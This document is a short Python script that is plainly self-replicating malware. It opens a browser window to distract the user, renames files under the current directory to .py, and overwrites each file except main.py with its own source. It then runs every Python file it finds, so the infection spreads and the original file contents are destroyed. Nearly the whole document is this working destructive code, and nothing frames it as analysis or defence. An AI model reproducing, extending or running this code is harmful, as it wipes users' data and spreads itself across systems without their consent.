import os
import sys
import platform
import subprocess

def HideMalware():
    if platform.system() == 'Windows':
        os.startfile('msedge.exe')
    elif platform.system() == 'Darwin':
        os.system('open -a Safari')
    else:
        os.system('firefox')

def convert_files_to_python(directory):
    #Converts files with extensions to Python files (.py) within the given directory and its subdirectories.
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file == "main.py": 
                continue

            if os.path.isfile(file):
                filename, extension = os.path.splitext(file)
                new_path = os.path.join(root, f"{filename}.py")
                try:
                    os.rename(os.path.join(root, file), new_path)
                except:
                    continue

def InfectedFileContent():
    with open(sys.argv[0], 'r') as f:
        maliciousContent = f.read()
    return maliciousContent

def inject_malicious_content(directory):
    #Injects malicious content into files within the given directory and its subdirectories.
    for root, dirs, files in os.walk(directory):
        malicious_content = InfectedFileContent()
        for file in files:
            file_path = os.path.join(root, file)
            try:
                if not os.path.isfile(file_path):
                    continue  # Skip non-files

                if file == "main.py": 
                    continue

                with open(file_path, 'r') as f:
                    if f.read() == malicious_content:
                        continue

                with open(file_path, 'w') as f:
                    f.write(malicious_content)
            except:
                continue

def execute_all_python_files(directory):
    for root, directories, files in os.walk(directory):
        for file in files:
            if file.endswith(".py"):  # Check for Python files
                file_path = os.path.join(root, file)
                try:
                    if sys.argv[0] != os.getcwd() + '/' + file:
                        subprocess.run(["python3", file_path])
                except:
                    continue

def main():

    # Hide malware with tab of browser
    # You can send user to welcome page of application for spend user's time
    HideMalware()

    #Converts files and injects malicious content in the current directory and subdirectories.
    current_directory = os.getcwd()

    convert_files_to_python(current_directory)  # Convert files in the current directory
    inject_malicious_content(current_directory)  # Inject content in the current directory and subdirectories
    execute_all_python_files(os.getcwd())
    
if __name__ == '__main__':
    main()
